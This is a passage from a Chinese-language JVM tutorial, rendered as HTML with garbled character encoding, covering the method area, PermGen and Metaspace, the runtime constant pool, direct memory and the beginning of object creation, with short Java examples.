        local++;             <span class="hljs-comment">// åœ¨æ ˆä¸­è®¡ç®—</span>
        shared = local;      <span class="hljs-comment">// å†™å›ä¸»å†…å­˜ï¼ˆå †ï¼‰</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">thread2</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä¹Ÿä»ä¸»å†…å­˜ï¼ˆå †ï¼‰è¯»å–</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">local</span> <span class="hljs-operator">=</span> shared;  <span class="hljs-comment">// ä»å †è¯»å–åˆ°æ ˆ</span>
        <span class="hljs-comment">// å¦‚æœthread1çš„ä¿®æ”¹è¿˜æ²¡å†™å›ï¼Œthread2å¯èƒ½çœ‹ä¸åˆ°æœ€æ–°çš„å€¼</span>
        <span class="hljs-comment">// è¿™å°±æ˜¯å¯è§æ€§é—®é¢˜</span>
    }
}
</code></pre>
<h3 data-id="heading-44">7. æ–¹æ³•åŒºï¼ˆMethod Areaï¼‰</h3>
<h4 data-id="heading-45">7.1 æ–¹æ³•åŒºç»“æ„å›¾</h4>
<pre><code class="hljs">æ–¹æ³•åŒºç»“æ„ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   ç±»ä¿¡æ¯     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   å¸¸é‡æ±      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  é™æ€å˜é‡    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ JITç¼–è¯‘ä»£ç   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-46">7.2 ä½œç”¨</h4>
<p>æ–¹æ³•åŒºç”¨äºå­˜å‚¨ï¼š</p>
<ul>
<li><strong>ç±»ä¿¡æ¯</strong>ï¼šç±»çš„å…ƒæ•°æ®ã€æ–¹æ³•ä¿¡æ¯ã€å­—æ®µä¿¡æ¯ç­‰</li>
<li><strong>å¸¸é‡</strong>ï¼šå­—ç¬¦ä¸²å¸¸é‡ã€æ•°å­—å¸¸é‡ç­‰ï¼ˆè¿è¡Œæ—¶å¸¸é‡æ± ï¼‰</li>
<li><strong>é™æ€å˜é‡</strong>ï¼šç±»å˜é‡ï¼ˆstaticä¿®é¥°çš„å˜é‡ï¼‰</li>
<li><strong>JITç¼–è¯‘åçš„ä»£ç </strong>ï¼šè¢«JITç¼–è¯‘å™¨ç¼–è¯‘åçš„æœºå™¨ç </li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MethodAreaExample</span> {
    <span class="hljs-comment">// é™æ€å˜é‡ â†’ æ–¹æ³•åŒº</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">staticVar</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;
    
    <span class="hljs-comment">// ç±»ä¿¡æ¯ â†’ æ–¹æ³•åŒº</span>
    <span class="hljs-comment">// - ç±»çš„åç§°ã€çˆ¶ç±»ã€æ–¹æ³•ã€å­—æ®µç­‰ä¿¡æ¯éƒ½å­˜å‚¨åœ¨æ–¹æ³•åŒº</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å­—ç¬¦ä¸²å¸¸é‡ â†’ æ–¹æ³•åŒºï¼ˆè¿è¡Œæ—¶å¸¸é‡æ± ï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello"</span>;  <span class="hljs-comment">// "Hello"å­—ç¬¦ä¸²åœ¨æ–¹æ³•åŒºçš„å¸¸é‡æ± ä¸­</span>
    }
}
</code></pre>
<h4 data-id="heading-47">7.3 JDK 8ä¹‹å‰ï¼šæ°¸ä¹…ä»£ï¼ˆPermGenï¼‰</h4>
<p><strong>æ°¸ä¹…ä»£ï¼ˆPermanent Generationï¼‰çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å †çš„ä¸€éƒ¨åˆ†ï¼Œä½¿ç”¨å †å†…å­˜</li>
<li>å¤§å°å›ºå®šï¼Œéœ€è¦é¢„å…ˆè®¾ç½®</li>
<li>å®¹æ˜“å‘ç”Ÿå†…å­˜æº¢å‡º</li>
</ul>
<p><strong>å¤§å°è®¾ç½®ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">-XX:<span class="hljs-attr">PermSize</span>=<span class="hljs-number">64</span>m        // åˆå§‹æ°¸ä¹…ä»£å¤§å°
-XX:<span class="hljs-attr">MaxPermSize</span>=<span class="hljs-number">256</span>m    // æœ€å¤§æ°¸ä¹…ä»£å¤§å°
</code></pre>
<p><strong>å¼‚å¸¸ï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">OutOfMemoryError: PermGen space</span>
</code></pre>
<p><strong>äº§ç”ŸåŸå› ï¼š</strong></p>
<ol>
<li>ç±»åŠ è½½è¿‡å¤š</li>
<li>å­—ç¬¦ä¸²å¸¸é‡è¿‡å¤šï¼ˆString.intern()ï¼‰</li>
<li>æ°¸ä¹…ä»£å¤§å°è®¾ç½®è¿‡å°</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PermGenOOM</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// ä¸æ–­åŠ è½½ç±»ï¼Œå¯èƒ½å¯¼è‡´æ°¸ä¹…ä»£æº¢å‡º</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100000</span>; i++) {
            <span class="hljs-comment">// åŠ¨æ€åŠ è½½ç±»</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-48">7.4 JDK 8åŠä¹‹åï¼šå…ƒç©ºé—´ï¼ˆMetaspaceï¼‰</h4>
<p><strong>å…ƒç©ºé—´ï¼ˆMetaspaceï¼‰çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨æœ¬åœ°å†…å­˜ï¼ˆNative Memoryï¼‰ï¼Œä¸åœ¨å †ä¸­</li>
<li>å¤§å°åŠ¨æ€è°ƒæ•´</li>
<li>ä¸å†å—JVMå †å†…å­˜é™åˆ¶</li>
<li>åªæœ‰è¾¾åˆ°MaxMetaspaceSizeæ—¶æ‰ä¼šæŠ›å‡ºå¼‚å¸¸</li>
</ul>
<p><strong>å¤§å°è®¾ç½®ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">-XX:<span class="hljs-attr">MetaspaceSize</span>=<span class="hljs-number">64</span>m        // åˆå§‹å…ƒç©ºé—´å¤§å°
-XX:<span class="hljs-attr">MaxMetaspaceSize</span>=<span class="hljs-number">256</span>m    // æœ€å¤§å…ƒç©ºé—´å¤§å°ï¼ˆé»˜è®¤æ— é™åˆ¶ï¼‰
</code></pre>
<p><strong>å¼‚å¸¸ï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">OutOfMemoryError: Metaspace</span>
</code></pre>
<p><strong>äº§ç”ŸåŸå› ï¼š</strong></p>
<ol>
<li>ç±»åŠ è½½è¿‡å¤š</li>
<li>å…ƒæ•°æ®è¿‡å¤š</li>
<li>MaxMetaspaceSizeè®¾ç½®è¿‡å°</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetaspaceOOM</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// ä¸æ–­ç”ŸæˆåŠ¨æ€ç±»ï¼Œå¯èƒ½å¯¼è‡´å…ƒç©ºé—´æº¢å‡º</span>
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-comment">// åŠ¨æ€åˆ›å»ºç±»</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-49">7.5 æ°¸ä¹…ä»£ä¸å…ƒç©ºé—´çš„åŒºåˆ«</h4>








































<table><thead><tr><th>ç‰¹æ€§</th><th>æ°¸ä¹…ä»£ï¼ˆPermGenï¼‰</th><th>å…ƒç©ºé—´ï¼ˆMetaspaceï¼‰</th></tr></thead><tbody><tr><td><strong>å­˜å‚¨ä½ç½®</strong></td><td>å †å†…å­˜ä¸­</td><td>æœ¬åœ°å†…å­˜ï¼ˆNative Memoryï¼‰</td></tr><tr><td><strong>å¤§å°é™åˆ¶</strong></td><td>å›ºå®šå¤§å°ï¼Œéœ€è¦é¢„å…ˆè®¾ç½®</td><td>åŠ¨æ€è°ƒæ•´ï¼Œé»˜è®¤æ— é™åˆ¶</td></tr><tr><td><strong>å†…å­˜ç®¡ç†</strong></td><td>å—JVMå †å†…å­˜é™åˆ¶</td><td>ä¸å—JVMå †å†…å­˜é™åˆ¶</td></tr><tr><td><strong>GCå½±å“</strong></td><td>GCæ•ˆç‡è¾ƒä½</td><td>GCæ•ˆç‡è¾ƒé«˜</td></tr><tr><td><strong>æº¢å‡ºé—®é¢˜</strong></td><td>å®¹æ˜“æº¢å‡º</td><td>ç›¸å¯¹ä¸å®¹æ˜“æº¢å‡º</td></tr><tr><td><strong>é€‚ç”¨ç‰ˆæœ¬</strong></td><td>JDK 8ä¹‹å‰</td><td>JDK 8åŠä¹‹å</td></tr></tbody></table>
<p><strong>ä¸ºä»€ä¹ˆæ”¹ç”¨å…ƒç©ºé—´ï¼Ÿ</strong></p>
<ol>
<li><strong>æé«˜GCæ•ˆç‡</strong>ï¼šæ°¸ä¹…ä»£çš„GCæ•ˆç‡è¾ƒä½ï¼Œå…ƒç©ºé—´çš„GCæ•ˆç‡æ›´é«˜</li>
<li><strong>é¿å…æº¢å‡º</strong>ï¼šæ°¸ä¹…ä»£å›ºå®šå¤§å°å®¹æ˜“æº¢å‡ºï¼Œå…ƒç©ºé—´åŠ¨æ€è°ƒæ•´</li>
<li><strong>æ›´å¥½çš„å†…å­˜ç®¡ç†</strong>ï¼šå…ƒç©ºé—´ä½¿ç”¨æœ¬åœ°å†…å­˜ï¼Œç®¡ç†æ›´çµæ´»</li>
<li><strong>ä¸HotSpotåˆ†ç¦»</strong>ï¼šå…ƒç©ºé—´çš„å®ç°ä¸HotSpotåˆ†ç¦»ï¼Œæ›´å®¹æ˜“ä¼˜åŒ–</li>
</ol>
<h4 data-id="heading-50">7.6 æ–¹æ³•åŒºçš„å›æ”¶</h4>
<p><strong>æ–¹æ³•åŒºçš„å›æ”¶ä¸»è¦åŒ…æ‹¬ï¼š</strong></p>
<ol>
<li>
<p><strong>å¸¸é‡æ± çš„å›æ”¶</strong></p>
<ul>
<li>å¸¸é‡æ± ä¸­çš„å¸¸é‡å¦‚æœæ²¡æœ‰è¢«å¼•ç”¨ï¼Œå¯ä»¥è¢«å›æ”¶</li>
<li>å­—ç¬¦ä¸²å¸¸é‡çš„å›æ”¶</li>
</ul>
</li>
<li>
<p><strong>ç±»å‹çš„å¸è½½</strong></p>
<ul>
<li>æ¡ä»¶éå¸¸è‹›åˆ»</li>
<li>éœ€è¦æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶ï¼š
<ul>
<li>è¯¥ç±»çš„æ‰€æœ‰å®ä¾‹éƒ½å·²è¢«å›æ”¶</li>
<li>åŠ è½½è¯¥ç±»çš„ClassLoaderå·²è¢«å›æ”¶</li>
<li>è¯¥ç±»å¯¹åº”çš„java.lang.Classå¯¹è±¡æ²¡æœ‰è¢«å¼•ç”¨</li>
</ul>
</li>
</ul>
</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MethodAreaGC</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å­—ç¬¦ä¸²å¸¸é‡å¯èƒ½è¢«å›æ”¶ï¼ˆå¦‚æœæ²¡æœ‰è¢«å¼•ç”¨ï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello"</span>;  <span class="hljs-comment">// åœ¨å¸¸é‡æ± ä¸­</span>
        <span class="hljs-comment">// å¦‚æœstr1ä¸å†è¢«å¼•ç”¨ï¼Œå¸¸é‡"Hello"å¯èƒ½è¢«å›æ”¶</span>
    }
}
</code></pre>
<h3 data-id="heading-51">8. è¿è¡Œæ—¶å¸¸é‡æ± ï¼ˆRuntime Constant Poolï¼‰</h3>
<h4 data-id="heading-52">8.1 ä½œç”¨</h4>
<p>è¿è¡Œæ—¶å¸¸é‡æ± æ˜¯æ–¹æ³•åŒºçš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå­˜å‚¨ç¼–è¯‘æœŸç”Ÿæˆçš„å­—é¢é‡å’Œç¬¦å·å¼•ç”¨ã€‚</p>
<p><strong>å­˜å‚¨å†…å®¹ï¼š</strong></p>
<ul>
<li><strong>å­—é¢é‡</strong>ï¼šå­—ç¬¦ä¸²ã€æ•°å­—ç­‰å¸¸é‡å€¼</li>
<li><strong>ç¬¦å·å¼•ç”¨</strong>ï¼šç±»åã€æ–¹æ³•åã€å­—æ®µåç­‰ç¬¦å·</li>
<li><strong>ç›´æ¥å¼•ç”¨</strong>ï¼šç±»åŠ è½½åï¼Œç¬¦å·å¼•ç”¨è¢«è§£æä¸ºç›´æ¥å¼•ç”¨</li>
</ul>
<h4 data-id="heading-53">8.2 å¸¸é‡æ± çš„å†…å®¹</h4>
<p><strong>1. å­—é¢é‡</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstantPool</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello"</span>;    <span class="hljs-comment">// å­—é¢é‡"Hello"åœ¨å¸¸é‡æ± ä¸­</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;           <span class="hljs-comment">// æ•°å­—å­—é¢é‡</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;     <span class="hljs-comment">// å¸ƒå°”å­—é¢é‡</span>
    }
}
</code></pre>
<p><strong>2. ç¬¦å·å¼•ç”¨</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç¬¦å·å¼•ç”¨ï¼šç±»åã€æ–¹æ³•åã€å­—æ®µåç­‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SymbolReference</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ç¬¦å·å¼•ç”¨ï¼šç±»åã€æ–¹æ³•å</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// Objectæ˜¯ç¬¦å·å¼•ç”¨ï¼Œç±»åŠ è½½åè§£æä¸ºç›´æ¥å¼•ç”¨</span>
        obj.toString();             <span class="hljs-comment">// toStringæ˜¯ç¬¦å·å¼•ç”¨ï¼Œè§£æä¸ºç›´æ¥å¼•ç”¨</span>
    }
}
</code></pre>
<p><strong>3. ç›´æ¥å¼•ç”¨</strong></p>
<p>ç±»åŠ è½½åï¼Œç¬¦å·å¼•ç”¨è¢«è§£æä¸ºç›´æ¥å¼•ç”¨ï¼ˆæŒ‡å‘å®é™…çš„å†…å­˜åœ°å€ï¼‰ã€‚</p>
<h4 data-id="heading-54">8.3 ä¸æ–¹æ³•åŒºçš„å…³ç³»</h4>
<p><strong>JDKç‰ˆæœ¬å·®å¼‚ï¼š</strong></p>
<ul>
<li><strong>JDK 8ä¹‹å‰</strong>ï¼šè¿è¡Œæ—¶å¸¸é‡æ± æ˜¯æ–¹æ³•åŒºï¼ˆæ°¸ä¹…ä»£ï¼‰çš„ä¸€éƒ¨åˆ†</li>
<li><strong>JDK 8åŠä¹‹å</strong>ï¼šè¿è¡Œæ—¶å¸¸é‡æ± æ˜¯å †çš„ä¸€éƒ¨åˆ†ï¼ˆå­—ç¬¦ä¸²å¸¸é‡æ± ç§»åˆ°å †ä¸­ï¼‰</li>
</ul>
<p><strong>å˜åŒ–è¯´æ˜ï¼š</strong></p>
<p>JDK 8å°†å­—ç¬¦ä¸²å¸¸é‡æ± ä»æ°¸ä¹…ä»£ç§»åˆ°äº†å †ä¸­ï¼Œè¿™æ ·ï¼š</p>
<ul>
<li>å­—ç¬¦ä¸²å¯ä»¥è¢«GCå›æ”¶</li>
<li>å‡å°‘æ°¸ä¹…ä»£/å…ƒç©ºé—´çš„å‹åŠ›</li>
<li>æé«˜GCæ•ˆç‡</li>
</ul>
<h4 data-id="heading-55">8.4 å¸¸é‡æ± çš„å›æ”¶</h4>
<p><strong>å¸¸é‡æ± ä¸­çš„å¸¸é‡å¯ä»¥è¢«å›æ”¶ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstantPoolGC</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello"</span>;  <span class="hljs-comment">// "Hello"åœ¨å¸¸é‡æ± ä¸­</span>
        str1 = <span class="hljs-literal">null</span>;            <span class="hljs-comment">// str1ä¸å†å¼•ç”¨"Hello"</span>
        <span class="hljs-comment">// å¦‚æœæ²¡æœ‰å…¶ä»–åœ°æ–¹å¼•ç”¨"Hello"ï¼Œå®ƒå¯èƒ½è¢«GCå›æ”¶</span>
    }
}
</code></pre>
<p><strong>String.intern()æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StringIntern</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Hello"</span>);  <span class="hljs-comment">// å¯¹è±¡åœ¨å †ä¸­</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> str1.intern();        <span class="hljs-comment">// å°†å­—ç¬¦ä¸²æ”¾å…¥å¸¸é‡æ± </span>
        
        <span class="hljs-type">String</span> <span class="hljs-variable">str3</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello"</span>;              <span class="hljs-comment">// ä»å¸¸é‡æ± è·å–</span>
        System.out.println(str2 == str3);   <span class="hljs-comment">// trueï¼ŒåŒä¸€ä¸ªå¯¹è±¡</span>
    }
}
</code></pre>
<h3 data-id="heading-56">9. ç›´æ¥å†…å­˜ï¼ˆDirect Memoryï¼‰</h3>
<h4 data-id="heading-57">9.1 ä½œç”¨</h4>
<p>ç›´æ¥å†…å­˜æ˜¯å †å¤–å†…å­˜ï¼Œä¸å±äºJVMè¿è¡Œæ—¶æ•°æ®åŒºï¼Œä¹Ÿä¸å—JVMå †å†…å­˜é™åˆ¶ã€‚</p>
<p><strong>ä¸»è¦ç”¨é€”ï¼š</strong></p>
<ul>
<li>NIOï¼ˆNew I/Oï¼‰ä½¿ç”¨</li>
<li>æé«˜I/Oæ€§èƒ½</li>
<li>é¿å…Javaå †å’ŒNativeå †ä¹‹é—´çš„æ•°æ®å¤åˆ¶</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦ç›´æ¥å†…å­˜ï¼Ÿ</strong></p>
<p>ä¼ ç»ŸI/Oéœ€è¦å°†æ•°æ®ä»å†…æ ¸ç©ºé—´å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ï¼ˆJavaå †ï¼‰ï¼Œç„¶åJavaç¨‹åºæ‰èƒ½è®¿é—®ã€‚ä½¿ç”¨ç›´æ¥å†…å­˜å¯ä»¥ï¼š</p>
<ul>
<li>ç›´æ¥åœ¨å †å¤–å†…å­˜ä¸­æ“ä½œæ•°æ®</li>
<li>å‡å°‘æ•°æ®å¤åˆ¶æ¬¡æ•°</li>
<li>æé«˜I/Oæ€§èƒ½</li>
</ul>
<h4 data-id="heading-58">9.2 ç›´æ¥å†…å­˜çš„ç‰¹ç‚¹</h4>
<ol>
<li><strong>ä¸å—JVMå †å†…å­˜é™åˆ¶</strong>ï¼šç›´æ¥å†…å­˜ä¸åœ¨å †ä¸­ï¼Œä¸å—-Xmxé™åˆ¶</li>
<li><strong>å—æ“ä½œç³»ç»Ÿå†…å­˜é™åˆ¶</strong>ï¼šå—ç‰©ç†å†…å­˜å’Œæ“ä½œç³»ç»Ÿé™åˆ¶</li>
<li><strong>åˆ†é…å’Œå›æ”¶æˆæœ¬è¾ƒé«˜</strong>ï¼šåˆ†é…å’Œå›æ”¶éœ€è¦è°ƒç”¨ç³»ç»Ÿå‡½æ•°</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.nio.ByteBuffer;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DirectMemoryExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">useDirectMemory</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// åˆ†é…ç›´æ¥å†…å­˜</span>
        <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> ByteBuffer.allocateDirect(<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);  <span class="hljs-comment">// 1MBç›´æ¥å†…å­˜</span>
        
        <span class="hljs-comment">// ä½¿ç”¨ç›´æ¥å†…å­˜è¿›è¡ŒI/Oæ“ä½œ</span>
        <span class="hljs-comment">// ... I/Oæ“ä½œ ...</span>
        
        <span class="hljs-comment">// ç›´æ¥å†…å­˜ç”±Full GCæˆ–System.gc()å›æ”¶</span>
    }
}
</code></pre>
<h4 data-id="heading-59">9.3 ç›´æ¥å†…å­˜çš„åˆ†é…</h4>
<p><strong>åˆ†é…æ–¹å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ–¹å¼1ï¼šé€šè¿‡ByteBufferåˆ†é…</span>
<span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> ByteBuffer.allocateDirect(<span class="hljs-number">1024</span>);

<span class="hljs-comment">// æ–¹å¼2ï¼šåº•å±‚è°ƒç”¨Unsafe.allocateMemory()</span>
<span class="hljs-comment">// Unsafe.allocateMemory(size);</span>
</code></pre>
<p><strong>åº•å±‚å®ç°ï¼š</strong></p>
<ul>
<li>ç›´æ¥å†…å­˜çš„åˆ†é…é€šè¿‡è°ƒç”¨Unsafe.allocateMemory()å®ç°</li>
<li>è¿™æ˜¯æœ¬åœ°æ–¹æ³•ï¼Œç›´æ¥æ“ä½œæ“ä½œç³»ç»Ÿå†…å­˜</li>
</ul>
<h4 data-id="heading-60">9.4 ç›´æ¥å†…å­˜çš„å›æ”¶</h4>
<p><strong>å›æ”¶æœºåˆ¶ï¼š</strong></p>
<ol>
<li><strong>Full GCæ—¶å›æ”¶</strong>ï¼šFull GCä¼šå›æ”¶ç›´æ¥å†…å­˜</li>
<li><strong>System.gc()è§¦å‘å›æ”¶</strong>ï¼šè°ƒç”¨System.gc()å¯èƒ½è§¦å‘ç›´æ¥å†…å­˜å›æ”¶</li>
<li><strong>Cleaneræœºåˆ¶</strong>ï¼šJDK 9ä¹‹åä½¿ç”¨Cleaneræœºåˆ¶è‡ªåŠ¨å›æ”¶</li>
</ol>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li>ç›´æ¥å†…å­˜çš„å›æ”¶ä¸å®Œå…¨å—JVMæ§åˆ¶</li>
<li>å»ºè®®ä½¿ç”¨-XX:MaxDirectMemorySizeé™åˆ¶å¤§å°</li>
</ul>
<h4 data-id="heading-61">9.5 å¼‚å¸¸</h4>
<p><strong>OutOfMemoryError: Direct buffer memory</strong></p>
<p>å½“ç›´æ¥å†…å­˜ä¸è¶³æ—¶ï¼Œä¼šæŠ›å‡ºOutOfMemoryError: Direct buffer memoryã€‚</p>
<p><strong>äº§ç”ŸåŸå› ï¼š</strong></p>
<ol>
<li>ç›´æ¥å†…å­˜ä½¿ç”¨è¿‡å¤š</li>
<li>ç›´æ¥å†…å­˜æ²¡æœ‰åŠæ—¶å›æ”¶</li>
<li>-XX:MaxDirectMemorySizeè®¾ç½®è¿‡å°</li>
</ol>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ol>
<li>å¢åŠ -XX:MaxDirectMemorySize</li>
<li>å‡å°‘ç›´æ¥å†…å­˜çš„ä½¿ç”¨</li>
<li>åŠæ—¶é‡Šæ”¾ç›´æ¥å†…å­˜</li>
</ol>
<hr/>
<h2 data-id="heading-62">ç¬¬å››éƒ¨åˆ†ï¼šå¯¹è±¡çš„åˆ›å»ºä¸å†…å­˜å¸ƒå±€ï¼ˆé‡ç‚¹ï¼‰</h2>
<h3 data-id="heading-63">10. å¯¹è±¡åˆ›å»ºçš„å®Œæ•´æµç¨‹</h3>
<h4 data-id="heading-64">10.1 å¯¹è±¡åˆ›å»ºæµç¨‹å›¾</h4>
<pre><code class="hljs language-markdown" lang="markdown">å¯¹è±¡åˆ›å»ºæµç¨‹ï¼š

<span class="hljs-bullet">1.</span> ç±»åŠ è½½æ£€æŸ¥
   â†“
<span class="hljs-bullet">2.</span> åˆ†é…å†…å­˜ (æŒ‡é’ˆç¢°æ’/ç©ºé—²åˆ—è¡¨/TLAB)
   â†“
<span class="hljs-bullet">3.</span> åˆå§‹åŒ–é›¶å€¼
   â†“
<span class="hljs-bullet">4.</span> è®¾ç½®å¯¹è±¡å¤´ (Mark Word/ç±»å‹æŒ‡é’ˆ)
   â†“
<span class="hljs-bullet">5.</span> æ‰§è¡Œæ„é€ å‡½æ•°
</code></pre>
<h4 data-id="heading-65">10.2 ç±»åŠ è½½æ£€æŸ¥</h4>
<p><strong>æ£€æŸ¥è¿‡ç¨‹ï¼š</strong></p>
<p>å½“é‡åˆ°newæŒ‡ä»¤æ—¶ï¼ŒJVMé¦–å…ˆæ£€æŸ¥ï¼š</p>
<ol>
<li>æ£€æŸ¥è¿™ä¸ªæŒ‡ä»¤çš„å‚æ•°æ˜¯å¦èƒ½åœ¨å¸¸é‡æ± ä¸­å®šä½åˆ°ç±»çš„ç¬¦å·å¼•ç”¨</li>
<li>æ£€æŸ¥è¿™ä¸ªç¬¦å·å¼•ç”¨ä»£è¡¨çš„ç±»æ˜¯å¦å·²è¢«åŠ è½½ã€è§£æå’Œåˆå§‹åŒ–</li>
</ol>
<p><strong>å¦‚æœæ²¡æœ‰åŠ è½½ï¼š</strong></p>
<p>å¦‚æœæ²¡æœ‰åŠ è½½ï¼Œåˆ™æ‰§è¡Œç±»åŠ è½½è¿‡ç¨‹ï¼ˆåŠ è½½ã€éªŒè¯ã€å‡†å¤‡ã€è§£æã€åˆå§‹åŒ–ï¼‰ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectCreation</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// é‡åˆ°newæŒ‡ä»¤æ—¶ï¼Œå…ˆæ£€æŸ¥MyClassæ˜¯å¦å·²åŠ è½½</span>
        <span class="hljs-type">MyClass</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();  <span class="hljs-comment">// å¦‚æœMyClassæœªåŠ è½½ï¼Œå…ˆæ‰§è¡Œç±»åŠ è½½</span>
    }
}
</code></pre>
<h4 data-id="heading-66">10.3 åˆ†é…å†…å­˜</h4>
<p><strong>å†…å­˜åˆ†é…çš„æ–¹å¼ï¼š</strong></p>
